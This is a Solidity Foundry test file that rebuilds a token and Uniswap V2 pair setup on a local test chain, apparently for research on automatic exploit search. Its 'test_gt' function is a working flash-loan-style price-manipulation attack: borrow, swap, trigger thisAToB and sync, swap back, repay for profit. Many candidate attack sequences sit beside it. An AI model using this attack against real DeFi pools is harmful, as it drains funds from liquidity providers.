// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {RESA} from "./RESA.sol";
import {RESB} from "./RESB.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract RESTest is Test, BlockLoader {
    USDT usdt;
    RESA resA;
    RESB resB;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address usdtAddr;
    address resAAddr;
    address resBAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1665051347;
    uint112 reserve0pair = 260015849847947963440692;
    uint112 reserve1pair = 110613876127006;
    uint32 blockTimestampLastpair = 1665051026;
    uint256 kLastpair = 28764334780639874147119408317574911061;
    uint256 price0CumulativeLastpair = 11557766562542920381201746547367;
    uint256 price1CumulativeLastpair =
        107365230799754738692677721684334104442039344950074;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 260015849847947963440692;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtresA = 0;
    uint256 balanceOfusdtresB = 0;
    uint256 totalSupplyresA = 129995235857469934;
    uint256 balanceOfresApair = 110613876127006;
    uint256 balanceOfresAattacker = 0;
    uint256 balanceOfresAresA = 13784158870;
    uint256 balanceOfresAresB = 0;
    uint256 totalSupplyresB = 30000000000000000000000;
    uint256 balanceOfresBpair = 0;
    uint256 balanceOfresBattacker = 0;
    uint256 balanceOfresBresA = 30077093744322625693517;
    uint256 balanceOfresBresB = 0;

    function setUp() public {
        owner = address(this);
        usdt = new USDT();
        usdtAddr = address(usdt);
        resA = new RESA(totalSupplyresA);
        resAAddr = address(resA);
        resB = new RESB(totalSupplyresB);
        resBAddr = address(resB);
        pair = new UniswapV2Pair(
            address(usdt),
            address(resA),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        resA.transfer(address(resA), balanceOfresAresA);
        resB.transfer(address(resA), balanceOfresBresA);
        usdt.transfer(address(pair), balanceOfusdtpair);
        resA.transfer(address(pair), balanceOfresApair);
        resA.afterDeploy(address(pair), address(router), address(usdt));
        resA.transfer(address(resA), 1000000e8);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(usdt),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(usdt),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("Resa Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(resA),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(resA),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(resA),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("Resb Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(resB),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(resB),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(resB),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(pair),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(pair),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(resA),
            address(attacker),
            resA.decimals()
        );
        queryERC20BalanceDecimals(
            address(resB),
            address(attacker),
            resB.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_resA_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        resA.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_resA_owner(uint256 amount) internal eurus {
        resA.transfer(owner, amount);
    }

    function borrow_resB_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        resB.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_resB_owner(uint256 amount) internal eurus {
        resB.transfer(owner, amount);
    }

    function swap_pair_attacker_usdt_resA(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_resA_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        resA.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function addliquidity_resA_pair_resA_usdt() internal eurus {
        resA.thisAToB();
        pair.sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_resA(amt1, amt2);
        swap_pair_attacker_resA_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_usdt_resA(amt1, amt2);
        swap_pair_attacker_resA_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_resA(amt1, amt2);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_resA_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_resA_owner(amt0);
        swap_pair_attacker_resA_usdt(amt1, amt2);
        swap_pair_attacker_usdt_resA(amt3, amt4);
        payback_resA_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_resA_owner(amt0);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_resA_usdt(amt1, amt2);
        swap_pair_attacker_usdt_resA(amt3, amt4);
        payback_resA_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_resA_owner(amt0);
        swap_pair_attacker_resA_usdt(amt1, amt2);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_usdt_resA(amt3, amt4);
        payback_resA_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_resA(amt1, amt2);
        swap_pair_attacker_resA_usdt(amt3, amt4);
        swap_pair_attacker_usdt_resA(amt5, amt6);
        swap_pair_attacker_resA_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_usdt_resA(amt1, amt2);
        swap_pair_attacker_resA_usdt(amt3, amt4);
        swap_pair_attacker_usdt_resA(amt5, amt6);
        swap_pair_attacker_resA_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_resA(amt1, amt2);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_resA_usdt(amt3, amt4);
        swap_pair_attacker_usdt_resA(amt5, amt6);
        swap_pair_attacker_resA_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_resA(amt1, amt2);
        swap_pair_attacker_resA_usdt(amt3, amt4);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_usdt_resA(amt5, amt6);
        swap_pair_attacker_resA_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_resA(amt1, amt2);
        swap_pair_attacker_resA_usdt(amt3, amt4);
        swap_pair_attacker_usdt_resA(amt5, amt6);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_resA_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_resA_owner(amt0);
        swap_pair_attacker_resA_usdt(amt1, amt2);
        swap_pair_attacker_usdt_resA(amt3, amt4);
        swap_pair_attacker_resA_usdt(amt5, amt6);
        swap_pair_attacker_usdt_resA(amt7, amt8);
        payback_resA_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_resA_owner(amt0);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_resA_usdt(amt1, amt2);
        swap_pair_attacker_usdt_resA(amt3, amt4);
        swap_pair_attacker_resA_usdt(amt5, amt6);
        swap_pair_attacker_usdt_resA(amt7, amt8);
        payback_resA_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_resA_owner(amt0);
        swap_pair_attacker_resA_usdt(amt1, amt2);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_usdt_resA(amt3, amt4);
        swap_pair_attacker_resA_usdt(amt5, amt6);
        swap_pair_attacker_usdt_resA(amt7, amt8);
        payback_resA_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_resA_owner(amt0);
        swap_pair_attacker_resA_usdt(amt1, amt2);
        swap_pair_attacker_usdt_resA(amt3, amt4);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_resA_usdt(amt5, amt6);
        swap_pair_attacker_usdt_resA(amt7, amt8);
        payback_resA_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_resA_owner(amt0);
        swap_pair_attacker_resA_usdt(amt1, amt2);
        swap_pair_attacker_usdt_resA(amt3, amt4);
        swap_pair_attacker_resA_usdt(amt5, amt6);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_usdt_resA(amt7, amt8);
        payback_resA_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_resA_owner(1000000e8);
        printBalance("After step0 ");
        swap_pair_attacker_resA_usdt(
            resA.balanceOf(attacker),
            pair.getAmountOut(resA.balanceOf(attacker), address(resA))
        );
        printBalance("After step1 ");
        addliquidity_resA_pair_resA_usdt();
        printBalance("After step2 ");
        swap_pair_attacker_usdt_resA(
            90000e18,
            pair.getAmountOut(90000e18, address(usdt))
        );
        printBalance("After step3 ");
        payback_resA_owner((1000000e8 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_resA_owner(amt0);
        swap_pair_attacker_resA_usdt(amt1, amt2);
        addliquidity_resA_pair_resA_usdt();
        swap_pair_attacker_usdt_resA(amt3, amt4);
        payback_resA_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
